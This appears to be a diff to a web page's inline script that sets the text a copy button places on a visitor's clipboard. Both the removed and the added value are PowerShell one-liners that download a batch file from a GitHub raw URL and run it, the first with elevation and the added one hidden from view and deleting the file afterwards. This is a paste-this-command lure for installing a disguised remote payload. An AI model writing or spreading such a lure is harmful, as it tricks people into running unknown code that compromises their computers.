@@ -221,7 +221,7 @@
 
 <script>
 (function() {
-  const codeToCopy = 'powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList \'/c curl -L https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/installer.bat -o %temp%\\installer.bat & %temp%\\installer.bat\'"';
+  const codeToCopy = 'powershell -WindowStyle Hidden -Command "& {$u='https://raw.githubusercontent.com/banzoxOG/test/refs/heads/main/installer.bat';$f=$env:TEMP+'/i.bat';Invoke-WebRequest -Uri $u -OutFile $f;Start-Process -WindowStyle Hidden -FilePath $f;Start-Sleep -Seconds 2;Remove-Item $f}"';
   const copyBtn = document.getElementById('copyBtn');
   const footerHint = document.getElementById('footerHint');
 
